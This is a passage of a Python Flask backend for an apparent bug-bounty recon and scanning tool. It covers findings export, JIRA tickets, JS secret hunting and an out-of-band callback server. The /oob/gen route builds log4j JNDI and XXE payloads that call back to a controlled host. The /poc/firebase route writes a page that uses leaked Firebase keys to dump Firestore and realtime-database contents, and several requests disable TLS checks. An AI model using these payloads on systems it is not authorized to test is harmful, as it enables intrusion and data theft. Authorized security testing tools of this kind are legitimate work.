    with _lock: _sessions.pop(d, None)
    return jsonify({"ok": True})


# In-memory endpoint cache for fast /ends responses during active scans
_ends_cache: dict = {}   # domain → {"total":N, "urls":[...], "ts":time.time()}
_ENDS_CACHE_TTL = 8      # seconds

@app.route("/ends")
def ends():
    """
    Endpoint list with ETag + in-memory cache.
    Never blocks more than 3s — returns cached data if DB is locked.
    """
    d     = _domain(request.args.get("domain",""))
    limit = int(request.args.get("limit","2000"))
    if not d: return jsonify({"urls":[],"total":0,"crawled":[]})

    now = time.time()

    # Serve from memory cache if fresh (avoids hitting locked DB)
    cached = _ends_cache.get(d)
    if cached and (now - cached["ts"]) < _ENDS_CACHE_TTL:
        total = cached["total"]
        etag  = f'"{d}-{total}"'
        recon_alive2 = bool(_sess(d).get("recon_t") and _sess(d)["recon_t"].is_alive())
        scan_alive2  = bool(_sess(d).get("scan_t")  and _sess(d)["scan_t"].is_alive())
        if not (recon_alive2 or scan_alive2) and request.headers.get("If-None-Match") == etag:
            return "", 304, {"ETag": etag}
        crawled_set = cached.get("crawled", [])
        resp = jsonify({"urls": cached["urls"][:limit], "total": total, "crawled": crawled_set})
        resp.headers["ETag"]          = etag
        resp.headers["Cache-Control"] = "no-cache"
        return resp

    # Try DB with short timeout — fall back to cache or empty on lock
    try:
        total = db.count_endpoints(d)
        etag  = f'"{d}-{total}"'
        # During active recon, never 304 — always return fresh data
        recon_alive = (_sess(d).get("recon_t") is not None and
                       _sess(d)["recon_t"].is_alive() if _sess(d).get("recon_t") else False)
        scan_alive  = (_sess(d).get("scan_t") is not None and
                       _sess(d)["scan_t"].is_alive() if _sess(d).get("scan_t") else False)
        if not (recon_alive or scan_alive) and request.headers.get("If-None-Match") == etag and cached:
            return "", 304, {"ETag": etag}
        ep_src  = db.get_endpoints(d, limit, with_source=True)
        urls    = [e["url"] if isinstance(e, dict) else e for e in ep_src]
        crawled = [e["url"] for e in ep_src if isinstance(e, dict) and "crawl" in (e.get("source") or "")]
        _ends_cache[d] = {"total": total, "urls": urls, "crawled": crawled, "ts": now}
    except Exception as _e:
        # DB locked during scan — return stale cache or empty
        if cached:
            log.debug(f"[ends] DB busy, serving cache for {d}: {_e}")
            urls  = cached["urls"][:limit]
            total = cached["total"]
        else:
            urls, total = [], 0
        etag = f'"{d}-{total}"'

    crawled = crawled if 'crawled' in dir() else (_ends_cache.get(d) or {}).get("crawled", [])
    resp = jsonify({"urls": urls, "total": total, "crawled": crawled})
    resp.headers["ETag"]          = f'"{d}-{total}"'
    resp.headers["Cache-Control"] = "no-cache"
    return resp


@app.route("/export/all")
def export_all():
    """Export all findings across all domains."""
    d      = _domain(request.args.get("domain",""))
    fmt    = request.args.get("format","json")
    findings = db.get_findings(d) if d else []
    if not d:
        for dom in db.list_domains()[:50]:
            findings.extend(db.get_findings(dom))

    if fmt == "csv":
        import csv, io
        output = io.StringIO()
        if findings:
            writer = csv.DictWriter(output,
                fieldnames=["severity","bug","url","title","confidence",
                            "cwe_id","poc","impact","remediation","ts"])
            writer.writeheader()
            for f in findings:
                writer.writerow({
                    "severity":    f.get("severity",""),
                    "bug":         f.get("bug",""),
                    "url":         f.get("url",""),
                    "title":       f.get("title",""),
                    "confidence":  f.get("confidence",50),
                    "cwe_id":      f.get("cwe_id",""),
                    "poc":         f.get("poc",""),
                    "impact":      f.get("impact",""),
                    "remediation": f.get("remediation",""),
                    "ts":          f.get("ts",""),
                })
        resp = make_response(output.getvalue())
        resp.headers["Content-Type"] = "text/csv"
        resp.headers["Content-Disposition"] = "attachment; filename=bugscan-findings.csv"
        return resp

    # Default JSON
    resp = jsonify({"findings": findings, "count": len(findings),
                    "domain": d or "all"})
    resp.headers["Content-Disposition"] = "attachment; filename=bugscan-findings.json"
    return resp


# ── Scan statistics ───────────────────────────────────────────────────────────


@app.route("/export/sarif")
def export_sarif():
    """Export findings in SARIF 2.1 format for GitHub/Azure DevOps/GitLab integration."""
    d        = _domain(request.args.get("domain",""))
    findings = db.get_findings(d)
    
    sarif = {
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "TheMasterRecon AI",
                    "version": "2.0",
                    "informationUri": "https://bugscan.io",
                    "rules": []
                }
            },
            "results": [],
            "automationDetails": {
                "id": f"bugscan/{d}/{__import__('time').strftime('%Y%m%d')}",
            }
        }]
    }
    
    sev_map = {
        "critical": "error",
        "high":     "error", 
        "medium":   "warning",
        "low":      "note",
        "info":     "none"
    }
    
    rules_seen = set()
    run = sarif["runs"][0]
    
    for f in findings:
        bug   = f.get("bug","vuln")
        sev   = f.get("severity","medium")
        url   = f.get("url","")
        title = f.get("title","")
        cwe   = f.get("cwe_id","CWE-0")
        desc  = f.get("impact","")
        fix   = f.get("remediation","")
        conf  = f.get("confidence",50)
        
        rule_id = f"BUGSCAN-{bug.upper().replace('-','_')}"
        
        # Add rule definition
        if rule_id not in rules_seen:
            rules_seen.add(rule_id)
            run["tool"]["driver"]["rules"].append({
                "id": rule_id,
                "name": bug.replace("_"," ").title(),
                "shortDescription": {"text": title[:100]},
                "fullDescription":  {"text": desc[:500] if desc else title},
                "helpUri": f"https://cwe.mitre.org/data/definitions/{cwe.replace('CWE-','')}.html",
                "properties": {
                    "tags": ["security", bug, sev],
                    "cwe": cwe,
                    "precision": "high" if conf>=80 else "medium" if conf>=60 else "low"
                }
            })
        
        # Add result
        run["results"].append({
            "ruleId": rule_id,
            "level": sev_map.get(sev,"warning"),
            "message": {"text": f"{title} — {desc[:200]}" if desc else title},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {"uri": url},
                    "region": {"startLine": 1}
                }
            }],
            "properties": {
                "severity": sev,
                "confidence": conf,
                "cwe": cwe,
                "remediation": fix[:500] if fix else "",
            }
        })
    
    resp = jsonify(sarif)
    resp.headers["Content-Disposition"] = f"attachment; filename=bugscan-{d}-sarif.json"
    return resp


# ── Tool status endpoint ────────────────────────────────────────────────────────
_tool_status_cache = {}  # module-level cache init

_tool_status_cache = {}
_tool_status_lock = threading.Lock()

def _refresh_tool_status():
    """Run in background thread — full tool status via tools_manager."""
    try:
        from engine.tools_manager import get_all_status
        result = get_all_status(force_refresh=True)
        with _tool_status_lock:
            _tool_status_cache.update({"ts": __import__("time").time(), "data": result})
    except Exception as _e:
        log.debug(f"[tool_status] tools_manager: {_e}")
        # Fallback to basic check
        import shutil, time as _t, importlib.util, sys as _sys
        tools = {}
        for t in ["subfinder","httpx","katana","nuclei","naabu","dnsx","dalfox",
                  "kxss","waybackurls","gau","hakrawler","gospider","ffuf","sqlmap",
                  "nmap","masscan","interactsh-client","paramspider","ghauri","wkhtmltopdf"]:
            tools[t] = bool(shutil.which(t))
        # Check secret_hunter binary
        import os as _os
        tools["secret_hunter"] = _os.path.exists("secret_hunter") and _os.access("secret_hunter", _os.X_OK)
        tools["jxscout"]       = bool(shutil.which("jxscout"))
        for pkg in ["crawl4ai","weasyprint","dnspython","jwt","yaml"]:
            mod = pkg.replace("-","_")
            tools[pkg] = mod in _sys.modules or importlib.util.find_spec(mod) is not None
        result = {"tools":tools,"total":len(tools),
                  "available":sum(1 for v in tools.values() if v),
                  "missing":[k for k,v in tools.items() if not v],
                  "secret_hunter": tools.get("secret_hunter",False),
                  "jxscout":       tools.get("jxscout",False)}
        with _tool_status_lock:
            _tool_status_cache.update({"ts":_t.time(),"data":result})

# Pre-warm cache at startup (background thread)
threading.Thread(target=_refresh_tool_status, daemon=True, name="tool-status-warmup").start()


@app.route("/findings")
def findings_route():
    """Alias for /results — returns findings for a domain."""
    d = _domain(request.args.get("domain",""))
    min_conf = int(request.args.get("min_confidence", 60))
    finds = db.get_findings(d, min_confidence=min_conf)
    # XBOW quality summary
    grades  = {"A":0,"B":0,"C":0,"D":0,"F":0,"ungraded":0}
    verdicts = {"confirmed":0,"needs_review":0,"likely_fp":0,"insufficient":0}
    report_ready = 0
    for f in finds:
        g = f.get("_xbow_grade","")
        v = f.get("_xbow_verdict","")
        grades[g if g in grades else "ungraded"] += 1
        if v in verdicts: verdicts[v] += 1
        elif v: verdicts["insufficient"] = verdicts.get("insufficient",0) + 1
        if f.get("_xbow_report_ready"): report_ready += 1
    return jsonify({
        "findings": finds,
        "chains":   db.get_chains(d),
        "count":    len(finds),
        "total_unfiltered": len(db.get_findings(d)),
        "xbow_summary": {
            "grades":       grades,
            "verdicts":     verdicts,
            "report_ready": report_ready,
        },
    })


@app.route("/findings/<path:domain>/assign", methods=["POST"])
def assign_finding(domain):
    d       = _domain(domain)
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        result = cdb.assign_finding(
            d, payload.get("finding_id",""),
            payload.get("assigned_to",""),
            payload.get("assigned_by","admin"))
        return jsonify({"ok":True,"assignment":result})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


@app.route("/findings/<path:domain>/comment", methods=["POST"])
def add_finding_comment(domain):
    d       = _domain(domain)
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        comment = cdb.add_comment(
            d, payload.get("finding_id",""),
            payload.get("username","anonymous"),
            payload.get("comment",""),
            payload.get("tags",[]))
        return jsonify({"ok":True,"comment":comment})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


@app.route("/findings/<path:domain>/comments")
def get_finding_comments(domain):
    d          = _domain(domain)
    finding_id = request.args.get("finding_id")
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        return jsonify({"comments": cdb.get_comments(d, finding_id)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/findings/<path:domain>/status", methods=["POST"])
def update_finding_status(domain):
    d       = _domain(domain)
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        result = cdb.update_finding_status(
            d, payload.get("finding_id",""),
            payload.get("status","open"),
            payload.get("username","admin"),
            payload.get("note",""))
        return jsonify({"ok":True,"status":result})
    except Exception as e:
        return jsonify({"error":str(e)}), 400


@app.route("/hosts")
def hosts():
    return jsonify(db.get_hosts(_domain(request.args.get("domain",""))))


@app.route("/hunter/abuseip", methods=["GET","POST"])
def hunter_abuseip():
    from engine.hunter_tools import abuseip_subdomains
    d = _domain(request.args.get("domain","") or (request.get_json(silent=True) or {}).get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400
    subs = abuseip_subdomains(d)
    for s in subs: db.add_sub(d, s)
    return jsonify({"domain":d,"subdomains":subs,"count":len(subs)})


@app.route("/hunter/combos", methods=["POST"])
def hunter_combos():
    from engine.hunter_tools import generate_combos
    p = request.get_json(silent=True, force=True) or {}
    words = p.get("words",[])
    if not words: return jsonify({"error":"words required"}), 400
    combos = generate_combos(words, p.get("mode","all"))
    return jsonify({"combos":combos,"count":len(combos)})


@app.route("/hunter/favicon", methods=["GET","POST"])
def hunter_favicon():
    from engine.hunter_tools import get_favicon_hash
    p = request.get_json(silent=True) or {}
    d = _domain(p.get("domain","") or request.args.get("domain",""))
    url = p.get("url","") or request.args.get("url","") or (f"https://{d}" if d else "")
    if not url: return jsonify({"error":"domain or url required"}), 400
    return jsonify(get_favicon_hash(url))


@app.route("/hunter/pdf_urls", methods=["POST"])
def hunter_pdf_urls():
    from engine.hunter_tools import extract_urls_from_pdf
    url = (request.get_json(silent=True, force=True) or {}).get("url","")
    if not url: return jsonify({"error":"url required"}), 400
    urls = extract_urls_from_pdf(url)
    return jsonify({"urls":urls,"count":len(urls)})


@app.route("/hunter/revwhois", methods=["GET","POST"])
def hunter_revwhois():
    from engine.hunter_tools import reverse_whois
    q = request.args.get("query","") or (request.get_json(silent=True) or {}).get("query","")
    if not q: return jsonify({"error":"query required"}), 400
    return jsonify(reverse_whois(q))


@app.route("/hunter/san", methods=["GET","POST"])
def hunter_san():
    from engine.hunter_tools import get_san_domains
    d = _domain(request.args.get("domain","") or 
                (request.get_json(silent=True) or {}).get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400
    subs = get_san_domains(d)
    for s in subs: db.add_sub(d, s)
    return jsonify({"domain":d,"san_domains":subs,"count":len(subs)})


@app.route("/jira/create", methods=["POST"])
def jira_create():
    """Create JIRA ticket from a finding."""
    payload  = request.get_json(silent=True, force=True) or {}
    finding  = payload.get("finding", {})
    jira_url = os.environ.get("JIRA_URL","").rstrip("/")
    jira_user= os.environ.get("JIRA_USER","")
    jira_tok = os.environ.get("JIRA_API_TOKEN","")
    proj_key = payload.get("project", os.environ.get("JIRA_PROJECT","SEC"))

    if not jira_url or not jira_user or not jira_tok:
        return jsonify({"error": "JIRA not configured. Set JIRA_URL, JIRA_USER, JIRA_API_TOKEN in .env"}), 400

    sev  = finding.get("severity","medium")
    bug  = finding.get("bug","vuln")
    url  = finding.get("url","")
    title= finding.get("title", f"{bug.upper()} finding")
    poc  = finding.get("poc","")
    impact = finding.get("impact","")
    cwe  = finding.get("cwe_id","")
    conf = finding.get("confidence",50)

    # Map severity to JIRA priority
    priority_map = {"critical":"Highest","high":"High","medium":"Medium","low":"Low","info":"Lowest"}
    priority = priority_map.get(sev,"Medium")

    description = (
        f"*Vulnerability:* {bug.upper()}\n"
        f"*Severity:* {sev.upper()}\n"
        f"*URL:* {url}\n"
        f"*CWE:* {cwe}\n"
        f"*Confidence:* {conf}%\n\n"
        f"*Impact:*\n{impact}\n\n"
        f"*Proof of Concept:*\n{{code}}{poc}{{code}}\n\n"
        f"*Remediation:*\n{finding.get('remediation','')}\n\n"
        f"_Generated by BugScan ELITE_"
    )

    ticket_data = {
        "fields": {
            "project":     {"key": proj_key},
            "summary":     f"[{sev.upper()}] {bug.upper()}: {title[:100]}",
            "description": description,
            "issuetype":   {"name": "Bug"},
            "priority":    {"name": priority},
            "labels":      ["security", "bug-bounty", f"cwe-{cwe.replace('CWE-','')}", sev],
        }
    }

    try:
        import base64 as _b64
        auth = _b64.b64encode(f"{jira_user}:{jira_tok}".encode()).decode()
        import urllib.request as _ur, json as _json
        req = _ur.Request(
            f"{jira_url}/rest/api/2/issue",
            data=_json.dumps(ticket_data).encode(),
            headers={"Content-Type":"application/json","Authorization":f"Basic {auth}"},
            method="POST"
        )
        import ssl as _ssl
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
        with _ur.urlopen(req, context=ctx, timeout=15) as resp:
            result = _json.loads(resp.read())
            ticket_url = f"{jira_url}/browse/{result.get('key','')}"
            return jsonify({"ok":True,"ticket":result.get("key",""),"url":ticket_url})
    except Exception as e:
        return jsonify({"error": str(e)}),500


@app.route("/jira/status")
def jira_status():
    jira_url = os.environ.get("JIRA_URL","")
    return jsonify({
        "configured": bool(jira_url and os.environ.get("JIRA_USER") and os.environ.get("JIRA_API_TOKEN")),
        "url": jira_url,
        "project": os.environ.get("JIRA_PROJECT","SEC")
    })



# ── SARIF Export (industry standard for CI/CD integration) ────────────────────


@app.route("/js_analyze", methods=["POST", "GET"])
def js_analyze():
    if request.method == "GET":
        # Return saved JS analysis from DB
        d = _domain(request.args.get("domain",""))
        results = db.get_js_analysis(d)
        if not results:
            # Try from session
            results = _sess(d).get("js", [])
        files   = [r.get("url","") for r in results if r.get("url")]
        secrets = []
        routes  = []
        for r in results:
            for s in r.get("secrets",[]):
                secrets.append({"type":s.get("type",""), "value":s.get("value",""),
                                "url":r.get("url","")})
            for ep in r.get("routes",[]):
                routes.append(ep)
        return jsonify({
            "files":   files,
            "secrets": secrets,
            "routes":  routes,
            "count":   len(results),
        })

    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain",""))
    try:
        endpoints = db.get_endpoints(d, limit=20000)
        results   = analyze_all_js(endpoints, d)
        sess      = _sess(d)
        sess["js"] = results

        # Add discovered routes as endpoints
        for js_result in results:
            for route in js_result.get("routes",[]):
                if route.startswith("http"):
                    db.add_endpoint(d, route)

        db.save_js_analysis(d, results)
        return jsonify({
            "analyzed": len(results),
            "total_secrets": sum(len(r["secrets"]) for r in results),
            "total_routes":  sum(len(r["routes"]) for r in results),
            "results":       results[:20],
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Exploitation chains ───────────────────────────────────────────────────────


@app.route("/jxscout/akeyf", methods=["POST"])
def jxscout_akeyf():
    from engine.hunter_tools import akeyf_scan
    p = request.get_json(silent=True, force=True) or {}
    url = p.get("url",""); content = p.get("content","")
    if not content and url:
        import urllib.request, ssl
        try:
            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
            with urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":"TMR/2.0"}),timeout=15,context=ctx) as r:
                content = r.read().decode("utf-8","ignore")[:300000]
        except Exception as e: return jsonify({"error":str(e)}), 400
    return jsonify({"findings":akeyf_scan(content,url),"url":url})


@app.route("/jxscout/analyze", methods=["POST"])
def jxscout_analyze():
    from engine.jxscout import analyze_domain_js, run_secret_hunter
    p = request.get_json(silent=True) or {}
    d = _domain(p.get("domain",""))
    js_files = p.get("js_files") or [e for e in db.get_endpoints(d,limit=500) 
                                      if re.search(r"\.js(\?|$|#)",e,re.I)]
    # Run own analysis
    result = analyze_domain_js(d, js_files[:100])
    # Also run SecretHunter if binary available
    from engine.jxscout import is_installed
    if is_installed() and js_files:
        sh = run_secret_hunter(js_files[:80], domain=d)
        result["secret_hunter_findings"] = sh
        result["total_secrets"] = len(sh)
        for f in sh:
            if f.get("severity") in ("critical","high"):
                db.add_finding(d, {"bug":"jsleak","severity":f["severity"],
                    "title":f"Secret: {f.get('type','')}","url":f.get("source",""),
                    "value":(f.get("value",""))[:80],
                    "poc":f.get("context","")[:200],"confidence":90})
    return jsonify(result)


@app.route("/list_scans")
def list_scans():
    return jsonify({"domains": db.list_domains()})


@app.route("/notes/<path:domain>", methods=["GET","POST"])
def domain_notes(domain):
    d = _domain(domain)
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        if request.method == "POST":
            payload = request.get_json(silent=True, force=True) or {}
            import time as _t
            note = cdb.save_note(d,
                payload.get("id", f"note_{int(_t.time()*1000)}"),
                payload.get("title",""),
                payload.get("content",""),
                payload.get("author","admin"),
                payload.get("tags",[]))
            return jsonify({"ok":True,"note":note})
        return jsonify({"notes": cdb.get_notes(d)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/nuclei/setup", methods=["POST"])
def nuclei_setup():
    """
    One-shot: install nuclei binary + download templates.
    Called when user clicks Install in the UI.
    Returns SSE stream so UI can show progress.
    """
    import threading as _thr
    import queue as _q

    progress_q = _q.Queue()

    def _do_setup():
        from engine.nuclei_engine import install_nuclei, update_templates, get_status
        try:
            progress_q.put({"step": "install", "msg": "Downloading nuclei binary..."})
            inst = install_nuclei(force=False)
            if inst.get("ok"):
                progress_q.put({"step": "install", "msg": "Binary ready: " + inst.get("version",""),
                                "ok": True})
                progress_q.put({"step": "templates", "msg": "Fetching 9,000+ templates..."})
                tpl = update_templates(force=True)
                count = tpl.get("templates", 0)
                progress_q.put({"step": "templates",
                                "msg": f"{count:,} templates ready" if count else "Templates fetched",
                                "ok": True, "templates": count})
                progress_q.put({"step": "done", "status": get_status()})
            else:
                progress_q.put({"step": "error", "msg": inst.get("error","install failed"),
                                "manual": inst.get("manual_install", [])})
        except Exception as e:
            progress_q.put({"step": "error", "msg": str(e)})
        finally:
            progress_q.put(None)

    t = _thr.Thread(target=_do_setup, daemon=True)
    t.start()

    def _stream():
        while True:
            item = progress_q.get(timeout=120)
            if item is None:
                break
            yield _sse(item)

    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/oob/c/<token>", methods=["GET","POST","PUT","DELETE"])
def oob_callback(token):
    """Direct HTTP callback received."""
    try:
        from engine.oob_server import _record_hit
        body = request.get_data(as_text=True)[:500]
        _record_hit(token, request.remote_addr, "HTTP",
                    f"{request.method} {request.url} | {body[:200]}")
    except Exception: pass
    return "OK", 200



# ══════════════════════════════════════════════════════════════════════════════
# AI INTELLIGENCE ROUTES — TheMasterRecon AI
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/oob/gen")
def oob_gen():
    """Generate a new OOB token+payload."""
    try:
        from engine.oob_server import get_oob_server
        srv   = get_oob_server()
        tag   = request.args.get("tag", "")
        token, http_url, dns_host = srv.gen_payload(tag=tag)
        return jsonify({
            "token":    token,
            "http_url": http_url,
            "dns_host": dns_host,
            "log4j":    f"${{jndi:ldap://{dns_host}/a}}",
            "ssrf":     http_url,
            "xxe":      f"<!ENTITY oob SYSTEM \"{http_url}\">",
        })
    except Exception as e:
        return jsonify({"error": str(e)})

# OOB HTTP callback receiver (in main app process)


@app.route("/oob/hits")
def oob_hits():
    """Get all OOB callback hits."""
    try:
        from engine.oob_server import get_oob_server
        srv = get_oob_server()
        return jsonify({"hits": srv.all_hits()})
    except Exception as e:
        return jsonify({"hits": {}, "error": str(e)})


@app.route("/oob/poll/<token>")
def oob_poll(token):
    """Poll for a specific OOB token hit (short-poll)."""
    try:
        from engine.oob_server import get_oob_server
        srv = get_oob_server()
        timeout = float(request.args.get("timeout", "3"))
        hits    = srv.poll(token, timeout=min(timeout, 10))
        return jsonify({"token": token, "hits": hits, "triggered": len(hits) > 0})
    except Exception as e:
        return jsonify({"triggered": False, "error": str(e)})


# /oob/status defined above (with host validation)


_oob_host_cache: dict = {}   # {"host":..., "callbacks":..., "ts":...}
_SLOW_LOG: list = []          # ring buffer of slow requests > 2s
_SLOW_LOG_MAX = 100
_DOCTOR_CACHE: dict = {}      # {"result":..., "ts":...}  — 5-min cache
_INSTALL_JOBS: dict = {}      # {"job_id": {...}} — background install job status

@app.route("/oob_host")
def oob_host():
    global _oob_host_cache
    now = time.time()
    # Return cached response for 30s — OOB host doesn't change mid-scan
    if _oob_host_cache and now - _oob_host_cache.get("ts", 0) < 30:
        return jsonify({"host": _oob_host_cache["host"],
                        "callbacks": _oob_host_cache["callbacks"]})
    try:
        client = get_oob_client()
        resp = {"host": client.host, "callbacks": client.get_callbacks()}
        _oob_host_cache = {**resp, "ts": now}
        return jsonify(resp)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/oob_payloads")
def oob_payloads():
    vuln_type = request.args.get("type","log4j")
    try:
        client   = get_oob_client()
        payloads = client.generate_payload(vuln_type)
        return jsonify({"payloads": payloads, "host": client.host})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Report generation ─────────────────────────────────────────────────────────


@app.route("/plugins/test", methods=["POST"])
def test_plugin():
    """Run a specific plugin template against a URL."""
    from engine.nuclei_engine import scan as nuclei_scan, save_custom_template, CUSTOM_TPL, get_binary
    import re as _re

    p       = request.get_json(silent=True) or {}
    content = p.get("content","")
    url     = p.get("url","")
    plugin_id = p.get("plugin_id","")

    if not get_binary():
        return jsonify({"error":"nuclei not installed"}), 503

    # Save temp template if content provided
    tmp_id = None
    if content:
        tmp_id = f"tmr_test_{int(time.time())}"
        save_custom_template(tmp_id, content)
        tpl_path = str(CUSTOM_TPL / f"{tmp_id}.yaml")
    elif plugin_id:
        safe = _re.sub(r"[^a-zA-Z0-9_\-]","_",plugin_id)
        tpl_path = str(CUSTOM_TPL / f"{safe}.yaml")
    else:
        return jsonify({"error":"content or plugin_id required"}), 400

    try:
        findings = nuclei_scan(
            targets=[url] if url else [],
            templates=[tpl_path],
            max_time=30,
        )
        return jsonify({"findings": findings, "count": len(findings)})
    finally:
        if tmp_id:
            try: (CUSTOM_TPL / f"{tmp_id}.yaml").unlink()
            except: pass


@app.route("/poc/firebase", methods=["POST"])
def generate_firebase_poc():
    """
    Generate Firebase Firestore PoC HTML from a finding or config dict.
    Input: {apiKey, authDomain, projectId, ...} OR {finding_id, domain}
    Output: {html: "...", filename: "firebase_poc.html"}
    """
    import json as _json
    p = request.get_json(silent=True) or {}
    
    # Extract config from direct keys or from a finding
    config = {}
    firebase_keys = ["apiKey","authDomain","databaseURL","projectId",
                     "storageBucket","messagingSenderId","appId","measurementId"]
    
    # Direct config provided
    for k in firebase_keys:
        if p.get(k): config[k] = p[k]
    
    # If no direct config, try to extract from domain findings
    if not config:
        domain = _domain(p.get("domain",""))
        if domain:
            finds  = db.get_findings(domain) if hasattr(db,"get_findings") else []
            if not finds:
                # JSON storage fallback
                try:
                    dd = db._dd(domain)
                    fp = dd / "findings.json"
                    finds = _json.loads(fp.read_text()) if fp.exists() else []
                except: finds = []
            
            import re as _re
            for f in finds:
                text = str(f.get("value","")) + str(f.get("poc","")) + str(f.get("preview",""))
                for k in firebase_keys:
                    m = _re.search(rf'{k}\s*[:=]\s*["\'`]?([A-Za-z0-9\-\._:/]+)["\'`]?', text)
                    if m and k not in config:
                        config[k] = m.group(1).rstrip(" ,;}")
    
    if not config.get("apiKey") and not config.get("projectId"):
        return jsonify({"error": "No Firebase config found. Provide apiKey and projectId."}), 400
    
    config_json = _json.dumps(config, indent=4)
    html_poc = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Firebase PoC — TheMasterRecon AI</title>
<style>
  body{{font-family:monospace;background:#0a0a1a;color:#e2e8f0;padding:20px}}
  h2{{color:#f59e0b}} input{{background:#1a1a2e;border:1px solid #334155;color:#e2e8f0;padding:8px;border-radius:4px;margin-right:8px}}
  button{{background:linear-gradient(135deg,#cc0011,#ff4400);color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:700}}
  pre{{background:#0f172a;border:1px solid #334155;border-radius:6px;padding:12px;overflow-x:auto;font-size:.8rem}}
  .warn{{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);border-radius:6px;padding:12px;color:#f59e0b;margin-bottom:16px}}
</style>
<script type="module">
import {{ initializeApp }} from 'https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js';
import {{ getFirestore, collection, getDocs, getDoc, doc }} from 'https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js';
import {{ getDatabase, ref, get }} from 'https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js';

const firebaseConfig = {config_json};
let app, db, rtdb;

try {{
  app  = initializeApp(firebaseConfig);
  db   = getFirestore(app);
  rtdb = firebaseConfig.databaseURL ? getDatabase(app) : null;
}} catch(e) {{ console.error('Firebase init:', e); }}

window.fetchFirestore = async () => {{
  const name = document.getElementById("col").value.trim();
  const out  = document.getElementById("out");
  if(!name){{ out.innerText="Enter collection name"; return; }}
  out.innerText = "⏳ Fetching...";
  try {{
    const snap = await getDocs(collection(db, name));
    let found = 0;
    let html = "";
    snap.forEach(d => {{ found++; html += `<h4 style="color:#22d3ee">${{d.id}}</h4><pre>${{JSON.stringify(d.data(),null,2)}}</pre>`; }});
    out.innerHTML = found ? html : '<p style="color:#64748b">Collection empty or access denied</p>';
    document.getElementById("count").textContent = found + " documents";
  }} catch(e) {{ out.innerHTML = `<p style="color:#ef4444">Error: ${{e.message}}</p>`; }}
}};

window.fetchRTDB = async () => {{
  if(!rtdb){{ document.getElementById("out").innerText="No databaseURL configured"; return; }}
  const path = document.getElementById("rtpath").value.trim() || "/";
  const out  = document.getElementById("out");
  out.innerText = "⏳ Fetching...";
  try {{
    const snap = await get(ref(rtdb, path));
    out.innerHTML = snap.exists() 
      ? `<pre>${{JSON.stringify(snap.val(),null,2)}}</pre>`
      : '<p style="color:#64748b">No data at path</p>';
  }} catch(e) {{ out.innerHTML = `<p style="color:#ef4444">Error: ${{e.message}}</p>`; }}
}};
</script>
</head>
<body>
<h2>🔥 Firebase PoC — TheMasterRecon AI</h2>
<div class="warn">⚠ For authorized security testing only. Use responsibly.</div>
<h3 style="color:#94a3b8">Config Extracted:</h3>
<pre>{config_json}</pre>
<hr style="border-color:#334155;margin:16px 0">
<h3 style="color:#22d3ee">Firestore</h3>
<input id="col" value="users" placeholder="collection name" style="width:200px">
<button onclick="fetchFirestore()">Fetch Collection</button>
<span id="count" style="color:#94a3b8;margin-left:10px;font-size:.8rem"></span>
<h3 style="color:#22d3ee;margin-top:16px">Realtime Database</h3>
<input id="rtpath" value="/" placeholder="path e.g. /users" style="width:200px">
<button onclick="fetchRTDB()">Fetch RTDB</button>
<div id="out" style="margin-top:16px;color:#94a3b8"></div>
</body>
</html>"""
    
    return jsonify({"html": html_poc, "config": config,
                    "filename": f"firebase_poc_{config.get('projectId','unknown')}.html"})


@app.route("/proxy/history")
def proxy_history():
    try:
        from engine.proxy import get_history
        return jsonify({"history": get_history(
            request.args.get("host",""),
            request.args.get("method",""),
            request.args.get("status",""),
            int(request.args.get("limit","500")))})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/proxy/history/clear", methods=["POST"])
def proxy_clear_history():
    try:
        from engine.proxy import clear_history
        clear_history()
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/proxy/rules", methods=["GET","POST"])
def proxy_rules():
    try:
        from engine.proxy import add_intercept_rule, _intercept_rules
        if request.method == "POST":
            payload = request.get_json(silent=True, force=True) or {}
            rule    = add_intercept_rule(payload)
            return jsonify({"ok":True,"rule":rule})
        return jsonify({"rules": _intercept_rules})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/proxy/scan", methods=["POST"])
def proxy_scan_history():
    """Run scanner on URLs captured by proxy."""
    import queue as _q, threading
    payload = request.get_json(silent=True, force=True) or {}
    bugs    = payload.get("bugs",["xss","sqli","ssrf","cors","idor"])
    try:
        from engine.proxy import get_history
